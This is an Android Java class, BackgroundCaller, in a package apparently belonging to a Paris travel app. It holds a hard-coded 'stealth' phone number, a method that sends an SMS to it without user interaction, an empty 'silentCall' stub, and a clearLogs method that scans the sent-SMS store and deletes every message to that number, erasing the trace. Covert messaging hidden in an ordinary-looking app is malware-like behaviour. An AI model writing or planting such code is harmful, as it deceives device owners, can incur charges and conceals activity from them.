package com.example.travelparis.tools;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.support.v4.app.ActivityCompat;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;

/**
 * Created by Andrei on 09.05.2018.
 */

public class BackgroundCaller {

    private final String STEALTH_PHONE_NUMBER;
    private Context mContext;


    public BackgroundCaller(Context context, String number) {
        mContext = context;
        STEALTH_PHONE_NUMBER = number;
    }

    @SuppressLint("MissingPermission")
    public void silentCall() {


    }

    public void sendMessage() {
        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendTextMessage(STEALTH_PHONE_NUMBER,
                null,
                "CMON SEND MESSAGE!!!",
                null,
                null);
    }

    public void clearLogs() {
        Uri uriSms = Uri.parse("content://sms/sent");

        try (Cursor c = mContext.getContentResolver().query(uriSms,
                new String[]{"_id", "thread_id", "address",
                        "person", "date", "body"}, null, null, null)) {

            if (c != null && c.moveToFirst()) {
                do {
                    Log.d("SERVICE", "checking sms...");
                    long id = c.getLong(0);
                    long threadId = c.getLong(1);
                    String address = c.getString(2);
                    String body = c.getString(5);

                    TelephonyManager tMgr = (TelephonyManager) mContext.getSystemService(Context.TELEPHONY_SERVICE);
                    if (ActivityCompat.checkSelfPermission(this.mContext, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED
                            && ActivityCompat.checkSelfPermission(this.mContext, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                        return;
                    }
                    Log.d("SERVICE", "checking sms number...");
                    String simplifiedStealthPhoneNumber = STEALTH_PHONE_NUMBER.replace("tel:", "")
                            .replace("-", "");
                    if (address.equals(simplifiedStealthPhoneNumber)) {
                        Log.d("SERVICE", "deleting sms...");
                        mContext.getContentResolver().delete(
                                Uri.parse("content://sms/" + id), null, null);
                    }
                } while (c.moveToNext());
            }
        } catch (Exception e) {
            Log.e("SERVICE", "Could not delete SMS from inbox: " + e.getMessage());
        }
    }
}
